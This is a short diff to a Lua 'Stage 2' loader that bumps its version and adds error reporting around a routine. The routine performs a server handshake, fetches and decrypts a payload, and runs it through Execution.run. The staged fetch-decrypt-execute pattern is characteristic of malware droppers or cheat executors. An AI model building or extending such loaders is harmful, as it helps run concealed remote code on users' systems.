@@ -9,7 +9,7 @@ print("[Stage 2] Core client initialized in memory.")
 ---------------------------------------------------------------------
 
 -- This version number is our ground truth for debugging deployments.
-local S2_VERSION = "1.1.0" 
+local S2_VERSION = "1.1.1" 
 
 print("[Stage 2] Loader Version: " .. S2_VERSION)
 
@@ -110,10 +110,17 @@ local function get_payload(session_token, symmetric_key)
     return decrypted_payload
 end
 
-pcall(function()
+-- === ENHANCED ERROR REPORTING ===
+-- We now capture the 'success' and 'err' return values from pcall.
+-- If 'success' is false, we print the error message that was previously hidden.
+local success, err = pcall(function()
     local server_public_key = do_handshake()
     local symmetric_key, session_token = do_exchange(server_public_key)
     local payload = get_payload(session_token, symmetric_key)
     print("[Stage 2] Handing off to final payload...")
     Execution.run(payload)
 end)
+
+if not success then
+    warn("[Stage 2] FATAL ERROR: " .. tostring(err))
+end
